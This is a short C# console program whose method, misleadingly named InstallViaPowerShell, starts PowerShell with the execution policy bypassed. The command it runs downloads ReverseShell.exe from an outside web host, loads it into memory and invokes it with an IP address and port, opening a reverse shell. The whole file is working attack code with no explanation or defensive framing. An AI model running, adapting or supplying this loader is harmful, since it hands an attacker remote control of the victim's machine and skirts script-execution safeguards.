using System;
using System.Diagnostics;

namespace ConsoleApp
{
    class Program
    {
        static void Main(string[] args)
        {

            InstallViaPowerShell();
        }

        public static void InstallViaPowerShell()
        {

            var ps1File = @"E:\Programming\Powershell\test.ps1";
            var command = @"$bytes=(New-Object Net.WebClient).DownloadData('https://hakkyahud.github.io/ReverseShell.exe');$assembly=[System.Reflection.Assembly]::Load($bytes);$entryPoint=$assembly.EntryPoint;[String[]]$parameter=@('192.168.80.130', '2936');$entryPoint.Invoke($null, (,$parameter));pause";

            var startInfo = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -ExecutionPolicy ByPass -command \"{command}\"",
                UseShellExecute = false
            };
            Process.Start(startInfo);

        }
    }
}
